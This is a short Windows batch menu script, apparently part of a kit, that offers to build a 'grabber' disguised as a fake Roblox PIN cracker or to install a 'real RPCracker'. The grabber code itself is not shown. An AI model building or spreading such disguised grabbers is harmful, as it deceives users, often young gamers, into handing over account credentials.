@echo off

title ELECTROBOMB - FRPC

chcp 65001 >nul

color 5
:menu



set /p rpc= %BS% [38;2;208;0;208m	       ╚═^>Do you want to make a "grabber"(1) or a real RPCracker(the real isn't mine)(2)					[0m 
if /I "%rpc%"=="1" (


 start notepad.exe ".fakeroblopin(rename).bat"
start explorer.exe %~dp0
)
   
      

if /I "%rpc%"=="2" call install.bat























